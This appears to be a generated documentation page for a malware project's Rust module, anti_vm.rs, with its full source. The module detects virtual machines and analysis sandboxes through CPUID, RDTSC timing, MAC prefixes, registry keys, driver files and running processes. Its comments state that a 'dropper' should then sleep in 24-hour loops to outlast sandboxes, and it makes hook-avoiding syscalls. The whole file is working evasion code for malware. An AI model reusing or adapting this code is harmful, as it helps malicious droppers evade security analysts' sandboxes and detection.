# crowd — anti_vm.rs  (🅱️ B TIER — CPUID/RDTSC/MAC detection, utility module)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/anti_vm.rs` |
| **Lines** | 437 |
| **Tier** | C |
| **Cards** | T013-anti-analysis |
| **Role** | Anti-VM (10 checks) |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 5 |

## Purpose

# crowd — anti_vm.rs  (🅱️ B TIER — CPUID/RDTSC/MAC detection, utility module)

Anti-VM / Anti-Sandbox detection — multi-layer.

Checks (ANY positive → `sleep_indefinitely()`):
01. CPUID hypervisor bit (leaf 1, ECX bit 31)
02. CPUID hypervisor vendor string (VMware / VBox / KVM / Hyper-V / Xen / Parallels)
03. RDTSC delta timing — measure cost of CPUID, compare before/after
04. CPU core count < 4 (singlecores/dual are common in sandboxes)
05. RAM < 4 GB (GlobalMemoryStatusEx)
06. MAC address vendor prefix (VBox / VMware / Parallels / Xen / Hybrid Analysis)
07. Registry key artifacts (VBox / VMware / QEMU / VBOX ACPI tables)
08. Registry value artifacts (BIOS versions, SCSI Identifier strings)
09. Filesystem artifacts (VBox/VMware drivers / tools)
10. Running process artifacts (vboxservice.exe, vmtoolsd.exe, qemu-ga.exe…)

## Detection response
**sleep_indefinitely()** — NOT abort/exit.
Self-termination is a sandbox detection signal. The dropper must appear alive.
The 24h delay outlasts any automated sandbox window and memory dump timeline.

## RDTSC technique
Read TSC before and after a CPUID instruction. On bare metal the cost is
~150–300 cycles; in most hypervisors (KVM, VMware) the VM-exit overhead
pushes it to >1000 cycles. We use a conservative 500-cycle threshold.

## Constants

- `SAMPLES`: `usize` = `16`
- `THRESHOLD`: `u64` = `500`

## Types

### struct `MemoryStatusEx` (line 233)

## Public API

### `run_anti_vm` (line 36)
```rust
pub fn run_anti_vm()
```
Call `check_vm()` before anything else.
If an indicator is found, enter an indefinite sleep (24h loop).

### `check_all_fsm` (line 71)
```rust
pub fn check_all_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool
```
FSM integration: returns `true` if clean (continue), `false` if VM detected (bail out).

### `check_vm` (line 106)
```rust
pub fn check_vm() -> bool
```
Returns `true` if any VM/sandbox indicator is detected.

## Internal Functions

- `sleep_indefinitely` — Sleeps the current thread for ~24 hours in an infinite loop. (line 45)
- `check_cpuid` (line 119)
- `check_rdtsc` — On real hardware, CPUID costs ~150–300 TSC cycles. (line 148)
- `rdtsc_serialized` (line 187)
- `check_core_count` (line 205)
- `check_ram` (line 231)
- `GlobalMemoryStatusEx` (line 246)
- `check_mac_prefix` (line 273)
- `get_mac_address` (line 292)
- `check_registry_keys` (line 334)
- `registry_key_exists` (line 369)
- `registry_value_matches` (line 377)
- `check_filesystem_artifacts` (line 398)
- `check_running_processes` (line 421)

## Macros

- `chk!` (macro_rules, line 78)

## Key Dependencies

- `use raw_cpuid::CpuId;`
- `use raw_cpuid::TopologyType;`
- `use winapi::um::iphlpapi::GetAdaptersInfo;`
- `use winapi::um::iptypes::IP_ADAPTER_INFO;`

## Full Source

```rust
//! # crowd — anti_vm.rs  (🅱️ B TIER — CPUID/RDTSC/MAC detection, utility module)
//!
//! Anti-VM / Anti-Sandbox detection — multi-layer.
//!
//! Checks (ANY positive → `sleep_indefinitely()`):
//!   01. CPUID hypervisor bit (leaf 1, ECX bit 31)
//!   02. CPUID hypervisor vendor string (VMware / VBox / KVM / Hyper-V / Xen / Parallels)
//!   03. RDTSC delta timing — measure cost of CPUID, compare before/after
//!   04. CPU core count < 4 (singlecores/dual are common in sandboxes)
//!   05. RAM < 4 GB (GlobalMemoryStatusEx)
//!   06. MAC address vendor prefix (VBox / VMware / Parallels / Xen / Hybrid Analysis)
//!   07. Registry key artifacts (VBox / VMware / QEMU / VBOX ACPI tables)
//!   08. Registry value artifacts (BIOS versions, SCSI Identifier strings)
//!   09. Filesystem artifacts (VBox/VMware drivers / tools)
//!   10. Running process artifacts (vboxservice.exe, vmtoolsd.exe, qemu-ga.exe…)
//!
//! ## Detection response
//! **sleep_indefinitely()** — NOT abort/exit.
//! Self-termination is a sandbox detection signal. The dropper must appear alive.
//! The 24h delay outlasts any automated sandbox window and memory dump timeline.
//!
//! ## RDTSC technique
//! Read TSC before and after a CPUID instruction. On bare metal the cost is
//! ~150–300 cycles; in most hypervisors (KVM, VMware) the VM-exit overhead
//! pushes it to >1000 cycles. We use a conservative 500-cycle threshold.

#![allow(dead_code)]

use raw_cpuid::CpuId;
use std::fs;
use std::process::Command;
#[allow(unused_imports)] use crate::mega_dbg;

/// Call `check_vm()` before anything else.
/// If an indicator is found, enter an indefinite sleep (24h loop).
pub fn run_anti_vm() {
    if check_vm() {
        sleep_indefinitely();
    }
}

/// Sleeps the current thread for ~24 hours in an infinite loop.
/// Uses NtDelayExecution if available, falls back to std::thread::sleep.
/// Intentionally never returns — the dropper appears alive to process monitors.
fn sleep_indefinitely() -> ! {
    // 24 hours in 100-nanosecond intervals (negative = relative)
    let interval_24h: i64 = -(24i64 * 60 * 60 * 10_000_000);
    loop {
        // Try NtDelayExecution via the syscall gate (no Win32 hook surface)
        unsafe {
            // Attempt syscall-gate path first
            if let Some((ssn, gadget)) = crate::syscall_map::get_ssn_and_gadget(
                crate::resolve::compute_hash("NtDelayExecution")
            ) {
                if gadget != 0 {
                    crate::recycled::recycled2(
                        ssn, gadget,
                        0usize,                            // Alertable = FALSE
                        &interval_24h as *const i64 as _,
                    );
                    continue;
                }
            }
        }
        // Fallback: std sleep
        std::thread::sleep(std::time::Duration::from_secs(86400));
    }
}

/// FSM integration: returns `true` if clean (continue), `false` if VM detected (bail out).
pub fn check_all_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool {
    // Respetar el flag --no-anti-vm
    if !ctx.config.anti_vm {
        mega_dbg!("AntiVM: SKIP — --no-anti-vm activo");
        return true;
    }

    macro_rules! chk {
        ($name:literal, $fn:expr) => {{
            let hit = $fn;
            if hit { mega_dbg!("AntiVM: DETECTADO — check '{}' disparado", $name); }
            else   { mega_dbg!("AntiVM: OK — check '{}' limpio", $name); }
            hit
        }};
    }

    let detected =
        chk!("CPUID hypervisor",      check_cpuid())
        || chk!("RDTSC timing",       check_rdtsc())
        || chk!("CPU core count <4",  check_core_count())
        || chk!("RAM <4 GB",          check_ram())
        || chk!("MAC vendor prefix",  check_mac_prefix())
        || chk!("registry artifacts", check_registry_keys())
        || chk!("filesystem drivers", check_filesystem_artifacts())
        || chk!("VM processes",       check_running_processes());

    if detected {
        mega_dbg!("AntiVM: VM/Sandbox detectado → transitando a BailOut");
    } else {
        mega_dbg!("AntiVM: todos los checks pasaron — sistema limpio");
    }
    !detected
}

/// Returns `true` if any VM/sandbox indicator is detected.
pub fn check_vm() -> bool {
    check_cpuid()
        || check_rdtsc()
        || check_core_count()
        || check_ram()
        || check_mac_prefix()
        || check_registry_keys()
        || check_filesystem_artifacts()
        || check_running_processes()
}

// ── Check 01 + 02: CPUID hypervisor bit + vendor string ──────────────────────

fn check_cpuid() -> bool {
    let cpuid = CpuId::new();

    // Leaf 1, ECX bit 31 — hypervisor present
    let hypervisor_bit = cpuid
        .get_feature_info()
        .map_or(false, |i| i.has_hypervisor());

    // Hypervisor vendor leaf (0x40000000) — get_hypervisor_info reads the correct leaf
    let hypervisor_vendor = cpuid.get_hypervisor_info().map_or(false, |hv| {
        let s = hv.identify();
        // raw_cpuid::Hypervisor enum covers the major ones; for completeness
        // also check the raw 12-byte vendor string
        matches!(s, raw_cpuid::Hypervisor::KVM
                  | raw_cpuid::Hypervisor::VMware
                  | raw_cpuid::Hypervisor::HyperV
                  | raw_cpuid::Hypervisor::Xen
                  | raw_cpuid::Hypervisor::QEMU
                  | raw_cpuid::Hypervisor::Unknown(_, _, _))
    });

    hypervisor_bit || hypervisor_vendor
}

// ── Check 03: RDTSC delta timing ─────────────────────────────────────────────

/// On real hardware, CPUID costs ~150–300 TSC cycles.
/// On most hypervisors the VM-exit pushes this above 500–2000 cycles.
/// Threshold: 500 cycles. Run 16 samples, take median.
fn check_rdtsc() -> bool {
    // Ensure TSC is available
    let cpuid = CpuId::new();
    if cpuid.get_feature_info().map_or(true, |f| !f.has_tsc()) {
        return false; // can't measure — assume clean
    }

    const SAMPLES: usize = 16;
    const THRESHOLD: u64 = 500;

    let mut deltas = [0u64; SAMPLES];

    for d in deltas.iter_mut() {
        let t0 = rdtsc_serialized();
        // Execute CPUID to force a VM-exit in hypervisors.
        // LLVM reserves RBX on x86_64, so we swap it via a tmp register.
        unsafe {
            core::arch::asm!(
                "xchg rbx, {tmp:r}",
                "xor eax, eax",
                "cpuid",
                "xchg rbx, {tmp:r}",
                tmp = out(reg) _,
                out("eax") _,
                out("ecx") _,
                out("edx") _,
                options(nostack),
            );
        }
        let t1 = rdtsc_serialized();
        *d = t1.saturating_sub(t0);
    }

    deltas.sort_unstable();
    let median = deltas[SAMPLES / 2];
    median > THRESHOLD
}

#[inline(always)]
fn rdtsc_serialized() -> u64 {
    unsafe {
        // LFENCE ensures prior instructions complete before RDTSC
        core::arch::asm!("lfence", options(nostack, nomem));
        let lo: u32;
        let hi: u32;
        core::arch::asm!(
            "rdtsc",
            out("eax") lo,
            out("edx") hi,
            options(nostack, nomem),
        );
        ((hi as u64) << 32) | (lo as u64)
    }
}

// ── Check 04: CPU core count < 4 ─────────────────────────────────────────────

fn check_core_count() -> bool {
    // CPUID leaf 0xB (x2APIC / topology) — physical cores
    // Fallback: leaf 1, EBX[23:16] = logical processor count
    let cpuid = CpuId::new();

    // First try extended topology
    if let Some(ext) = cpuid.get_extended_topology_info() {
        for level in ext {
            use raw_cpuid::TopologyType;
            if level.level_type() == TopologyType::Core {
                return level.processors() < 4;
            }
        }
    }

    // Fallback: leaf 1 logical count
    if let Some(fi) = cpuid.get_feature_info() {
        let logical = fi.max_logical_processor_ids();
        return (logical as u32) < 4;
    }

    false
}

// ── Check 05: RAM < 4 GB ──────────────────────────────────────────────────────

fn check_ram() -> bool {
    #[repr(C)]
    struct MemoryStatusEx {
        dw_length: u32,
        dw_memory_load: u32,
        ull_total_phys: u64,
        ull_avail_phys: u64,
        ull_total_page_file: u64,
        ull_avail_page_file: u64,
        ull_total_virtual: u64,
        ull_avail_virtual: u64,
        ull_avail_ext_virtual: u64,
    }

    unsafe extern "system" {
        fn GlobalMemoryStatusEx(lp_buffer: *mut MemoryStatusEx) -> i32;
    }

    let mut ms = MemoryStatusEx {
        dw_length: std::mem::size_of::<MemoryStatusEx>() as u32,
        dw_memory_load: 0,
        ull_total_phys: 0,
        ull_avail_phys: 0,
        ull_total_page_file: 0,
        ull_avail_page_file: 0,
        ull_total_virtual: 0,
        ull_avail_virtual: 0,
        ull_avail_ext_virtual: 0,
    };

    unsafe {
        if GlobalMemoryStatusEx(&mut ms) == 0 {
            return false; // can't determine — assume clean
        }
    }

    // < 4 GB of physical RAM
    ms.ull_total_phys < 4 * 1024 * 1024 * 1024
}

// ── Check 06: MAC address vendor prefix ───────────────────────────────────────

fn check_mac_prefix() -> bool {
    get_mac_address()
        .map(|mac| {
            let vm_macs: &[[u8; 3]] = &[
                [0x08, 0x00, 0x27], // VirtualBox
                [0x00, 0x05, 0x69], // VMware
                [0x00, 0x0C, 0x29], // VMware
                [0x00, 0x1C, 0x14], // VMware
                [0x00, 0x50, 0x56], // VMware
                [0x00, 0x1C, 0x42], // Parallels
                [0x00, 0x16, 0x3E], // Xen
                [0x0A, 0x00, 0x27], // Hybrid Analysis / Cuckoo
                [0x52, 0x54, 0x00], // QEMU/KVM default
            ];
            vm_macs.iter().any(|prefix| mac.starts_with(prefix))
        })
        .unwrap_or(false)
}

fn get_mac_address() -> Option<Vec<u8>> {
    // Use GetAdaptersInfo Win32 API — locale-independent, no process spawn.
    // Returns the MAC of the first adapter with a non-zero physical address.
    unsafe {
        use winapi::um::iphlpapi::GetAdaptersInfo;
        use winapi::um::iptypes::IP_ADAPTER_INFO;

        // First call: query required buffer size
        let mut buf_len: u32 = 0;
        let err = GetAdaptersInfo(std::ptr::null_mut(), &mut buf_len);
        // ERROR_BUFFER_OVERFLOW (111) is expected — buf_len now has the needed size
        if err != 111 || buf_len == 0 {
            return None;
        }

        let mut buf: Vec<u8> = vec![0u8; buf_len as usize];
        let adapter_ptr = buf.as_mut_ptr() as *mut IP_ADAPTER_INFO;
        let err = GetAdaptersInfo(adapter_ptr, &mut buf_len);
        if err != 0 {
            return None;
        }

        // Walk the linked list of adapters
        let mut cur = adapter_ptr;
        while !cur.is_null() {
            let info = &*cur;
            let addr_len = info.AddressLength as usize;
            if addr_len == 6 {
                let mac = info.Address[..6].to_vec();
                // Skip all-zero MACs (loopback / virtual with no HW addr)
                if mac.iter().any(|&b| b != 0) {
                    return Some(mac);
                }
            }
            cur = info.Next;
        }
        None
    }
}

// ── Check 07: Registry key artifacts ─────────────────────────────────────────

fn check_registry_keys() -> bool {
    let reg_keys: &[&str] = &[
        r"HKEY_LOCAL_MACHINE\HARDWARE\ACPI\DSDT\VBOX__",
        r"HKEY_LOCAL_MACHINE\HARDWARE\ACPI\FADT\VBOX__",
        r"HKEY_LOCAL_MACHINE\HARDWARE\ACPI\RSDT\VBOX__",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\VBoxGuest",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\VBoxMouse",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\VBoxService",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\VBoxSF",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\VBoxVideo",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Wine",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters",
    ];

    let reg_value_artifacts: &[(&str, &str, &str)] = &[
        (r"HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", "Identifier", "VMWARE"),
        (r"HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", "Identifier", "VBOX"),
        (r"HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", "Identifier", "QEMU"),
        (r"HKLM\HARDWARE\Description\System\SystemBiosVersion", "", "VMWARE"),
        (r"HKLM\HARDWARE\Description\System\SystemBiosVersion", "", "VBOX"),
        (r"HKLM\HARDWARE\Description\System\SystemBiosVersion", "", "QEMU"),
        (r"HKLM\HARDWARE\Description\System\VideoBiosVersion",  "", "VIRTUALBOX"),
        (r"HKLM\HARDWARE\Description\System\SystemBiosDate",    "", "06/23/99"),
        (r"HKLM\SYSTEM\ControlSet001\Control\SystemInformation", "SystemManufacturer", "VMWARE"),
        (r"HKLM\SYSTEM\ControlSet001\Control\SystemInformation", "SystemProductName",  "VMWARE"),
    ];

    reg_keys.iter().any(|&k| registry_key_exists(k))
        || reg_value_artifacts
            .iter()
            .any(|&(key, val, expected)| registry_value_matches(key, val, expected))
}

fn registry_key_exists(key: &str) -> bool {
    Command::new("reg")
        .args(["query", key])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn registry_value_matches(key: &str, value_name: &str, expected_value: &str) -> bool {
    if value_name.is_empty() && expected_value.is_empty() {
        return registry_key_exists(key);
    }
    let mut cmd = Command::new("reg");
    cmd.args(["query", key]);
    if !value_name.is_empty() {
        cmd.args(["/v", value_name]);
    }
    cmd.output()
        .map(|o| {
            o.status.success()
                && String::from_utf8_lossy(&o.stdout)
                    .to_uppercase()
                    .contains(&expected_value.to_uppercase())
        })
        .unwrap_or(false)
}

// ── Check 08 + 09: Filesystem + process artifacts ─────────────────────────────

fn check_filesystem_artifacts() -> bool {
    let paths: &[&str] = &[
        r"C:\Windows\system32\drivers\VBoxMouse.sys",
        r"C:\Windows\system32\drivers\VBoxGuest.sys",
        r"C:\Windows\system32\drivers\VBoxSF.sys",
        r"C:\Windows\system32\drivers\VBoxVideo.sys",
        r"C:\Windows\system32\vboxdisp.dll",
        r"C:\Windows\system32\vboxhook.dll",
        r"C:\Windows\system32\vboxmrxnp.dll",
        r"C:\Windows\system32\vboxogl.dll",
        r"C:\Windows\system32\vboxservice.exe",
        r"C:\Windows\system32\vboxtray.exe",
        r"C:\Windows\system32\VBoxControl.exe",
        r"C:\Windows\system32\drivers\vmmouse.sys",
        r"C:\Windows\system32\drivers\vmhgfs.sys",
        r"C:\Windows\system32\drivers\vm3dmp.sys",
        r"C:\Windows\system32\drivers\vmmemctl.sys",
        r"C:\Windows\system32\drivers\vmrawdsk.sys",
        r"C:\Windows\system32\drivers\vmusbmouse.sys",
    ];
    paths.iter().any(|&p| fs::metadata(p).is_ok())
}

fn check_running_processes() -> bool {
    let out = match Command::new("wmic").args(["process", "get", "name"]).output() {
        Ok(o) => String::from_utf8_lossy(&o.stdout).to_ascii_lowercase(),
        Err(_) => return false,
    };

    let vm_procs: &[&str] = &[
        "vboxservice.exe", "vboxtray.exe",
        "vmtoolsd.exe",    "vmwaretray.exe",
        "vmwareuser.exe",  "vgauthservice.exe", "vmacthlp.exe",
        "vmsrvc.exe",      "vmusrvc.exe",
        "prl_cc.exe",      "prl_tools.exe",
        "xenservice.exe",  "qemu-ga.exe",
    ];

    vm_procs.iter().any(|t| out.contains(t))
}

```